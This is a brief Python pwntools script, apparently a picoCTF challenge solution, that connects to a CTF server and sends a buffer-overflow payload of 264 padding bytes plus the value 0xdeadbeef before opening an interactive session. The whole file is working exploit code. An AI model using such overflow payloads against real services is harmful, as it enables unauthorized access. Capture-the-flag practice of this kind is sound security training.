from pwn import *

context.bits = 64

p = remote("mars.picoctf.net", 31890)

payload = b"A"*264
payload += p64(0xdeadbeef)

p.sendline(payload)
p.interactive()
